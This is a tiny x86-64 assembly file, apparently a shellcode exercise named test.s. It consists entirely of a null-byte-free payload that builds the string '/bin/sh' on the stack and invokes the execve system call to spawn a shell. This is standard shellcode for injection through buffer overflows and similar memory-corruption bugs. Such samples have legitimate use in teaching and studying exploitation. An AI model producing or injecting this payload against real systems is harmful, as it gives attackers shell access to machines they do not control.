;test.s
Section .text

global _start
 
_start:

mov rbx, 0x68732f6e69622fff
shr rbx, 0x8
push rbx
mov rdi, rsp
xor rdx, rdx
xor rax, rax
xor rsi, rsi
mov al, 0x3b
syscall